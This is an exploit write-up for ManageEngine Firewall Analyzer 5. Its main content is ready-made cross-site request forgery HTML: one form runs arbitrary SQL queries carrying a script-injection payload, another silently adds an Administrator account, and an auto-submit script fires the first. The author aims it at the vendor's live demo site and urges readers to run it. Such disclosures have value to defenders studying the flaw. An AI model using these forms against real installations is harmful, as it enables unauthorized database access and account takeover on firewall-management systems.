ManageEngine Firewall Analyzer 5 XSRF/XSS Vulnerability
=======================================================

Written By Michael Brooks
Special thanks to str0ke!


Product: ManageEngine Firewall Analyzer 5 - XSRF and XSS
Vulerable version:
Build Version  :  	5.0.0
Build Number  :  	5000
Build Date  :  	Apr_25
homepage:
http://fwanalyzer.com/

This is live exploit code against the online demo.   Go ahead,  run it!

With this exploit you can execute any SQL query you want,  this is not
SQL Injection.  I think its funny that the sql query is also
vulnerable to xss.

XSRF to execute Arbatrary SQL Queries.  This is not SQL Injection,
its better because you can execute *any*  query.
<html>
	<form action=&#039;http://demo.fwanalyzer.com/fw/runQuery.do&#039; method=&#039;POST&#039; id=1>
		<input type=hidden name="execute" value="true" >
		<input type=hidden name="DatabaseType" value="mysql">
		<input type=hidden name="query" value=&#039;select
"<script>alert(/0wn3d/)</script>"&#039;>
		<input type=submit>
	</form>
</html>

Create a new administrative account badmin:badmin:
<html>
	<form action=&#039;http://demo.fwanalyzer.com/fw/userManagementForm.do&#039;
method=&#039;POST&#039; id=2>
		<input type=hidden name=&#039;addField&#039; value=&#039;true&#039;>
		<input type=hidden name=&#039;productName&#039; value=&#039;firewall&#039;>
		<input type=hidden name=&#039;userType&#039; value=&#039;Administrator&#039;>
		<input type=hidden name=&#039;licType&#039; value=&#039;Prem&#039;>
		<input type=hidden name=&#039;userName&#039; value=&#039;madmin&#039;>
		<input type=hidden name=&#039;pwd1&#039; value=&#039;badmin&#039;>
		<input type=hidden name=&#039;password&#039; value=&#039;badmin&#039;>
		<input type=hidden name=&#039;userGroup&#039; value=&#039;Administrator&#039;>
		<input type=hidden name=&#039;email&#039; value=&#039;badmin@badmin.com&#039;>
		<input type=hidden name=&#039;availableDevices&#039; value=&#039;301&#039;>
		<input type=hidden name=&#039;Submit3&#039; value=&#039;Add User&#039;>
		<input type=submit>
		</form>
</html>

<script>
	document.getElementById(1).submit();
	//document.getElementById(2).submit();
</script>



